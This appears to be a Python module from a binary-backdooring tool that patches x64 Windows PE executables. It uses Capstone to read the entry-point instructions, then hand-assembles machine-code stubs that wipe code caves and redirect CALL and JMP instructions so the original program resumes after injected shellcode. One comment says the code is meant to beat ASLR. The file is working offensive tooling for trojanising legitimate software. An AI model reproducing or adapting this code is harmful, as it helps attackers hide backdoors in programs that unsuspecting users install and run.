from capstone import *
import struct
import random
import logging
import os
import io
from pe.core import intelCore
logger = logging.getLogger(__name__)


class call_core:

    def __init__(self, BDF=None):
        self.BDF = BDF    
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "call_core"
        self.description = """Supports CALL opcode patching"""
        self.requirements = {}
        self.intelCore = intelCore.intelCore()


    def clean_caves_stub(self, CavesToFix):
        stub = bytes("\x48\x31\xC0"                          # xor rax,rax
                "\x48\x31\xC9"                          # xor rcx,rcx
                "\x65\x48\x8B\x49\x60"                  # mov rcx,QWORD PTR gs:[rcx+0x60]
                "\x48\x8B\x49\x10"                      # mov rcx,QWORD PTR [rcx+0x10]
                "\x48\x89\xCB"                          # mov rbx,rcx
                , 'iso-8859-1')
        for cave, values in CavesToFix.items():
            stub += b"\x48\xbf"                          # mov rdi, value below
            stub += struct.pack("<Q", values[0])
            stub += b"\x48\x01\xDF"                      # add rdi, rbx
            stub += b"\x48\xb9"                          # mov rcx, value below
            stub += struct.pack("<Q", values[1])
            stub += b"\xf3\xaa"                          # REP STOS BYTE PTR ES:[EDI]
        return stub

    # originally called pe64_entry_instr
    def entry_instr(self):
        """
        For x64 files. Updated to use Capstone-Engine.
        """
        logger.info("[*] Reading win64 entry instructions")
        self.BDF.pe_object['loaded_binary'].seek(0)

        self.BDF.pe_object['loaded_binary'].seek(self.BDF.pe_object['LocOfEntryinCode'],0)
        self.count = 0
        self.BDF.pe_object['ImpList'] = []
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        for k in md.disasm(self.BDF.pe_object['loaded_binary'].read(20), self.BDF.pe_object['VrtStrtngPnt']):
            self.count += k.size
            _bytes = bytearray(b'')

            if len(k.bytes) < k.size:     
                _bytes = bytearray(b"\x00" * (k.size - len(k.bytes)))

            value_bytes = k.bytes + _bytes

            self.BDF.pe_object['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                          k.mnemonic.encode("utf-8"),
                                          k.op_str.encode("utf-8"),
                                          int(hex(k.address).strip('L'), 16) + k.size,
                                          value_bytes,
                                          k.size])

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

        logger.debug(f"self.BDF.pe_object[ImpList] {self.BDF.pe_object['ImpList']}")
        self.BDF.pe_object['count_bytes'] = self.count
        self.BDF.pe_object['loaded_binary'].seek(0)

    # originally called resume_execution_64
    def resume_execution_call(self):
        """
        For x64 exes...
        """
        logger.info("[*] Creating win64 resume execution stub")
        #pause loop for code cave clearing stub
        resumeExe = b''
        # below, add rsp, 8 to fix up from the jmp payloads, will need to test
        resumeExe += b"\x48\x83\xC4\x08" 
        resumeExe += b"\x51"             # push ecx
        resumeExe += b"\x48\xc7\xc1"             # mov ecx, value below
        resumeExe += struct.pack("<I", (len(self.BDF.pe_object['shellcode']) - 6))
        resumeExe += b"\xe2\xfe"         # loop back on itself
        resumeExe += b"\x59"             # pop ecx

        total_opcode_len = 0
        for item in self.BDF.pe_object['ImpList']:
            startingPoint = item[0]
            OpCode = item[1]
            CallValue = item[2]
            ReturnTrackingAddress = item[3]
            entireInstr = item[4]
            total_opcode_len += item[5]
            self.intelCore.ones_compliment(TESTING=self.BDF.TESTING)
            if OpCode == b'call':  # Call instruction
                CallValue = int(CallValue, 16)
                resumeExe += b"\x48\x89\xd0"  # mov rad,rdx
                resumeExe += b"\x48\x83\xc0"  # add rax,xxx
                resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
                resumeExe += b"\x50"  # push rax
                if len(entireInstr[1:]) <= 4:  # 4294967295:
                    resumeExe += b"\x48\xc7\xc1"  # mov rcx, 4 bytes
                    resumeExe += entireInstr[1:]
                elif len(entireInstr[1:]) > 4:  # 4294967295:
                    resumeExe += b"\x48\xb9"  # mov rcx, 8 bytes
                    resumeExe += entireInstr[1:]

                resumeExe += b"\x48\x01\xc8"  # add rax,rcx
                resumeExe += b"\x50"
                resumeExe += b"\x48\x31\xc9"  # xor rcx,rcx
                resumeExe += b"\x48\x89\xf0"  # mov rax, rsi
                resumeExe += b"\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.intelCore.compliment_you
                resumeExe += b"\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.intelCore.compliment_me
                resumeExe += b"\xc3"
                return ReturnTrackingAddress, resumeExe

            elif any(symbol in OpCode for symbol in self.intelCore.jmp_symbols):
                #Let's beat ASLR
                CallValue = int(CallValue, 16)
                resumeExe += b"\xb8"
                aprox_loc_wo_alsr = (startingPoint +
                                     self.BDF.pe_object['JMPtoCodeAddress'] +
                                     len(self.BDF.pe_object['shellcode']) + len(resumeExe) +
                                     200 + self.BDF.pe_object['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += b"\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += b"\x2b\xc1"  # sub eax,ecx
                resumeExe += b"\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += b"\x77\x0b"  # JA (14)
                resumeExe += b"\x83\xC1\x16"
                resumeExe += b"\x51"
                resumeExe += b"\xb8"  # Mov EAX ..
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5)  # Add+ EAX, CallValue
                resumeExe += b"\x50\xc3"
                resumeExe += b"\x8b\xf0"
                resumeExe += b"\x8b\xc2"
                resumeExe += b"\xb9"
                resumeExe += struct.pack('<I', startingPoint - 5)
                resumeExe += b"\x2b\xc1"
                resumeExe += b"\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue)
                resumeExe += b"\x50"
                resumeExe += b"\x33\xc9"
                resumeExe += b"\x8b\xc6"
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_you
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_me
                resumeExe += b"\xc3"
                return ReturnTrackingAddress, resumeExe

            else:
                resumeExe += entireInstr

        resumeExe += b"\x49\x81\xe7"
        resumeExe += self.intelCore.compliment_you  # zero out r15
        resumeExe += b"\x49\x81\xe7"
        resumeExe += self.intelCore.compliment_me  # zero out r15
        resumeExe += b"\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
        if ReturnTrackingAddress >= 4294967295:
            resumeExe += struct.pack('<Q', ReturnTrackingAddress)
        else:
            resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += b"\x41\x57"  # push r15
        resumeExe += b"\x49\x81\xe7"  # zero out r15
        resumeExe += self.intelCore.compliment_you
        resumeExe += b"\x49\x81\xe7"  # zero out r15
        resumeExe += self.intelCore.compliment_me
        resumeExe += b"\xC3"

        return ReturnTrackingAddress, resumeExe
